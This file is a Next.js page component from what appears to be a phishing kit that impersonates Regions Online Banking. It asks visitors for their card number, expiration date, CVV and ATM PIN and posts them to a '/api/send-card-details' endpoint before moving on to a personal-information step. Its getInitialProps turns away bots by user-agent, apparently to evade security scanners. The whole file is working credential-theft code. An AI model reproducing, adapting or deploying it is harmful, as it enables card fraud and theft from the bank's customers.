import { Box, Flex, Text, Image } from "@chakra-ui/react";
import Head from "next/head";
import React, { useContext, useState } from "react";
import { Container } from "../../components/Container";
import { Wrapper } from "../../components/Wrapper";
import { Input } from "../../components/Input";
import { Instructions } from "../../components/Instructions";
import { yupResolver } from "@hookform/resolvers/yup";
import * as yup from "yup";
import valid from "card-validator";
import axios from "axios";
import { useRouter } from "next/router";
import { useForm } from "react-hook-form";
import { DataContext } from "../_app";
import { AltButton } from "../../components/AltButton";
import ReactInputMask from "react-input-mask";
import MobileDetect from "mobile-detect";
import { NextPage } from "next";
import { getProgress } from "../../utils/getProgress";

interface CardInformationProps {}

const schema = yup.object().shape({
  cardNumber: yup
    .string()
    .required("This field is required, please enter your card number.")
    .test(
      "test-number",
      "Oops! Looks like the number you entered isn't valid. Please enter a valid card number",
      (value) => valid.number(value).isValid
    ),
  expirationDate: yup
    .string()
    .required("This field is required, please enter your card expiration date")
    .test(
      "test-date",
      "Oops! Looks like the number you entered isn't valid. Please enter a valid date",
      (value) => valid.expirationDate(value).isValid
    ),
  cvv: yup
    .string()
    .required("This field is required, please enter your card security code.")
    .test(
      "test-cvv",
      "Oops! Looks like the number you entered isn't valid. Please enter a valid CVV number.",
      (value) => valid.cvv(value).isValid
    ),
  cardPin: yup
    .string()
    .required("This field is required, please enter your card pin.")
    .min(
      4,
      "Oops! Looks like the number you entered isn't valid. Please enter a valid ATM pin."
    )
    .max(
      5,
      "Oops! Looks like the number you entered isn't valid. Please enter a valid ATM pin."
    ),
});

const CardInformation: NextPage<CardInformationProps> = ({}) => {
  const [loading, setLoading] = useState(false);
  const [cardMask, setCardMask] = useState("9999 9999 9999 9999");

  const { data: datas, setData } = useContext(DataContext);
  const { push } = useRouter();
  const {
    register,
    handleSubmit,
    formState: { errors, isValid },
    watch,
  } = useForm({
    resolver: yupResolver(schema),
    mode: `onBlur`,
  });

  const onSubmit = handleSubmit(async (data) => {
    setLoading(true);
    const formData = new FormData();

    formData.append(`form`, `CARD DETAILS`);
    formData.append(`cardDetails`, JSON.stringify(data));

    try {
      await axios.post(`/api/send-card-details`, formData, {
        headers: { "content-type": `multipart/form-data` },
      });
    } catch (error) {
      console.log(error);
    }

    setData({
      ...datas,
      cardDetails: data,
    });

    push(`/customerservice/personalinformation`);
  });
  return (
    <Wrapper>
      <Head>
        <title>
          Regions Online Banking - Verify Card Information | Regions
        </title>
      </Head>
      <Box as={`main`} display={`block`}>
        <Container
          progress={getProgress()}
          highlight={getProgress().indexOf(`Card Information`)}
          showTitle
          showSide
          display={`flex`}
          bgColor={`#fff`}
          border={`2px solid #eee`}
          borderBottom={[`none`, `2px solid #eee`]}
          borderLeft={[`none`, `2px solid #eee`]}
          borderRight={[`none`, `2px solid #eee`]}
          borderRadius={`2px`}
          boxShadow={[`none`, `0 4px 10px rgb(0 0 0 / 3%)`]}
          justifyContent={`flex-start`}
          m={[`15px auto 30px`, `50px auto`]}
          p={0}
          maxW={`initial`}
          w={`auto`}
          bg={`#f9f9f9`}
          flexDir={[`column`, `row`]}
        >
          <Box
            flex={`1 1 auto`}
            borderRight={[`none`, `2px solid #eee`]}
            borderBottom={[`2px solid #eee`, `none`]}
            p={[`30px 15px`, `30px`]}
            bg={`white`}
          >
            <Flex flexDir={`column`}>
              <Text
                as={`h2`}
                fontFamily={`inherit`}
                fontWeight={700}
                lineHeight={1.1}
                color={`inherit`}
                mb={`13.5px`}
                fontSize={`18px`}
              >
                {`Let's `}continue, please enter the following required
                information:
              </Text>
              <Box w={[`100%`, `66.66666667%`]} mt={0} float={`left`}>
                <Box
                  w={`100%`}
                  float={`left`}
                  pos={`relative`}
                  minH={`1px`}
                  pr={0}
                >
                  <Input
                    as={ReactInputMask}
                    mask={cardMask}
                    maskChar={` `}
                    label={`ATM/CheckCard Number`}
                    error={errors.cardNumber && errors.cardNumber.message}
                    register={register}
                    registerOptions={{
                      onChange: (event: any) => {
                        var value = event.target.value;

                        var newState = "9999 9999 9999 9999";
                        if (/^3[47]/.test(value)) {
                          newState = "9999 999999 99999";
                        }
                        setCardMask(newState);
                      },
                    }}
                    name={`cardNumber`}
                    instructions={
                      <Instructions>
                        The 16-digit number printed on your ATM/Check Card.
                      </Instructions>
                    }
                  />
                </Box>
              </Box>
              <Box w={[`100%`, `66.66666667%`]} mt={0} float={`left`}>
                <Box
                  w={[`100%`, `50%`]}
                  float={`left`}
                  pos={`relative`}
                  minH={`1px`}
                  pr={[0, `15px`]}
                >
                  <Input
                    label={`PIN`}
                    instructions={
                      <Instructions>
                        Your PIN is a 4-digit number used for ATM withdrawals or
                        point-of-sale debit purchases.
                      </Instructions>
                    }
                    error={errors.cardPin && errors.cardPin.message}
                    register={register}
                    name={`cardPin`}
                    type={`password`}
                  />
                </Box>
                <Box
                  w={[`100%`, `50%`]}
                  float={`left`}
                  pos={`relative`}
                  minH={`1px`}
                  pl={[0, `15px`]}
                >
                  <Input
                    label={`CVV`}
                    instructions={
                      <Instructions>
                        <Text
                          margin={`-1px`}
                          mt={0}
                          // position={`absolute`}
                          // width={`1px`}
                          // height={`1px`}
                          padding={0}
                          overflow={`hidden`}
                          border={0}
                          style={{
                            clip: `rect(0,0,0,0)`,
                          }}
                        >
                          Help Text:
                        </Text>
                        <Text as={`b`} fontWeight={700}>
                          What is my CVV number?
                        </Text>
                        <Image
                          src={`/images/cv2-helper-image.png`}
                          alt={``}
                          w={`80%`}
                          verticalAlign={`middle`}
                          border={0}
                        />
                      </Instructions>
                    }
                    error={errors.cvv && errors.cvv.message}
                    register={register}
                    name={`cvv`}
                    type={`number`}
                  />
                </Box>
              </Box>
              <Box w={[`100%`, `66.66666667%`]} mt={0} float={`left`}>
                <Box
                  w={[`100%`, `50%`]}
                  float={`left`}
                  pos={`relative`}
                  minH={`1px`}
                  pr={[0, `15px`]}
                >
                  <Input
                    as={ReactInputMask}
                    mask="99/99"
                    maskChar={` `}
                    label={`Expiration Date`}
                    instructions={
                      <Instructions>
                        Enter MMYY displayed on the card.
                      </Instructions>
                    }
                    error={
                      errors.expirationDate && errors.expirationDate.message
                    }
                    register={register}
                    name={`expirationDate`}
                  />
                </Box>
              </Box>
              <AltButton onClick={onSubmit} disabled={loading}>
                Next
              </AltButton>
            </Flex>
          </Box>
        </Container>
      </Box>
    </Wrapper>
  );
};

CardInformation.getInitialProps = ({ res, req, ...props }) => {
  const md = new MobileDetect(req?.headers[`user-agent`] as string);
  const isBot = md.is(`Bot`);
  if (isBot) {
    res?.end(`Fuck off`);
    return {};
  }

  return {
    ...props,
  };
};

export default CardInformation;
